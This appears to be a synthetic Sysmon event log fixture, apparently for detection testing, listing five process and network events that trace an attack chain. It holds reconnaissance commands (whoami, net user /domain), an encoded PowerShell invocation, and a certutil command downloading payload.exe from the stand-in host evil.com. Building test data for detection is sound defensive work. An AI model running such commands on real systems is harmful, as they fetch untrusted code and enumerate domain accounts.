{"Event":{"System":{"EventID":1,"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION01","TimeCreated":{"#attributes":{"SystemTime":"2024-01-15T10:30:00Z"}}},"EventData":{"Data":[{"@Name":"CommandLine","#text":"cmd.exe /c whoami"},{"@Name":"Image","#text":"C:\\Windows\\System32\\cmd.exe"},{"@Name":"ParentImage","#text":"C:\\Windows\\explorer.exe"},{"@Name":"User","#text":"CORP\\john.doe"},{"@Name":"IntegrityLevel","#text":"Medium"}]}}}
{"Event":{"System":{"EventID":1,"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION01","TimeCreated":{"#attributes":{"SystemTime":"2024-01-15T10:31:00Z"}}},"EventData":{"Data":[{"@Name":"CommandLine","#text":"powershell.exe -enc ZQBjAGgAbwAgACIAaABlAGwAbABvACIA"},{"@Name":"Image","#text":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\cmd.exe"},{"@Name":"User","#text":"CORP\\john.doe"},{"@Name":"IntegrityLevel","#text":"High"}]}}}
{"Event":{"System":{"EventID":1,"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION02","TimeCreated":{"#attributes":{"SystemTime":"2024-01-15T10:32:00Z"}}},"EventData":{"Data":[{"@Name":"CommandLine","#text":"net user /domain"},{"@Name":"Image","#text":"C:\\Windows\\System32\\net.exe"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\cmd.exe"},{"@Name":"User","#text":"CORP\\admin"},{"@Name":"IntegrityLevel","#text":"High"}]}}}
{"Event":{"System":{"EventID":1,"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"SERVER01","TimeCreated":{"#attributes":{"SystemTime":"2024-01-15T10:33:00Z"}}},"EventData":{"Data":[{"@Name":"CommandLine","#text":"certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe"},{"@Name":"Image","#text":"C:\\Windows\\System32\\certutil.exe"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\cmd.exe"},{"@Name":"User","#text":"CORP\\admin"},{"@Name":"IntegrityLevel","#text":"High"}]}}}
{"Event":{"System":{"EventID":3,"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION01","TimeCreated":{"#attributes":{"SystemTime":"2024-01-15T10:34:00Z"}}},"EventData":{"Data":[{"@Name":"SourceIp","#text":"192.168.1.100"},{"@Name":"DestinationIp","#text":"10.0.0.50"},{"@Name":"DestinationPort","#text":"443"},{"@Name":"Image","#text":"C:\\Windows\\System32\\cmd.exe"}]}}}
